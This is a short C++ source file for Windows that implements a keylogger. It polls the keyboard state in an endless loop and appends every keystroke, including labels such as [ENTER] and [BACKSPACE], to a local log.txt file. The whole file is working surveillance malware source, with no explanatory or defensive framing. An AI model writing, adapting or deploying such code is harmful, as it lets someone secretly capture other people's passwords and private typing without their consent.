#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>

using namespace std;

void startLogging(){
    char c;
    while (true)
    {
        for (c = 0; c <= 254; c++)
        {
            if(GetAsyncKeyState(c) & 0x1){
                ofstream log;
                log.open("log.txt", ios::app);
                switch (c){
                case VK_BACK:
                    log << "[BACKSPACE]";
                    break;
                case VK_RETURN:
                    log << "[ENTER]";
                    break;
                case VK_SHIFT:
                    log << "[SHIFT]";
                    break;
                case VK_CONTROL:
                    log << "[CONTROL]";
                    break;
                case VK_CAPITAL:
                    log << "[CAP]";
                    break;
                case VK_TAB:
                    log << "[TAB]";
                    break;
                case VK_SPACE:
                    log << "[SPACE]";
                    break;
                case VK_MENU:
                    log << "[ALT]";
                case VK_LBUTTON:
                case VK_RBUTTON:
                    break;
                default:
                    log << c;
                    break;
                }
            }
        }
    }
}

int main(){
    startLogging();
    return 0;
}
